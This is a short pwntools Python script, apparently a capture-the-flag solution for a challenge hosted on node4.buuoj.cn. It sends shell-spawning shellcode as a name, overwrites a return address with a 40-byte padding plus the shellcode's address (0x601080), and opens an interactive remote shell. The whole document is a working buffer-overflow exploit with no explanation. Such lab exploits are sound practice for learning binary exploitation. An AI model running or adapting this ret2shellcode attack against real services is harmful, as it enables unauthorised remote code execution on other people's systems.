from pwn import *

context(os="linux",arch="amd64")

# io = remote("192.168.95.131",10001)
io = remote("node4.buuoj.cn",27019)

shellcode_address = 0x601080

print(io.recvuntil(b"tell me your name"))

shellcode = asm(shellcraft.sh())

print(shellcode)


io.sendline(shellcode)

print(io.recvuntil(b"What do you want to say to me?"))

payload = flat(b"A"*40,shellcode_address)

io.sendline(payload)

io.recv()

io.interactive()